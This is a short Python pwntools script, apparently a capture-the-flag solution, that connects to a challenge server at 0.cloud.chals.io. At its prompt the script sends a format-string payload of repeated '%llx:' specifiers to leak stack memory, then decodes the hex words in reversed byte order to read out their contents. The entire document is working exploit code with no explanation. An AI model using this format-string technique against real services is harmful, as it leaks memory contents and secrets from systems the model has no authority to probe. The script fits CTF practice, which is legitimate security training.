from pwn import *
from binascii import unhexlify

r = remote('0.cloud.chals.io', 18978)
r.recvuntil(b'or die: ')
r.sendline(b'%llx:'*36)
data = r.recvuntil(b'die!')
for d in data.split(b':'):
	try:
		res = unhexlify(d)[::-1]
	except:
		res = d
	print(res, end=':')
r.interactive()

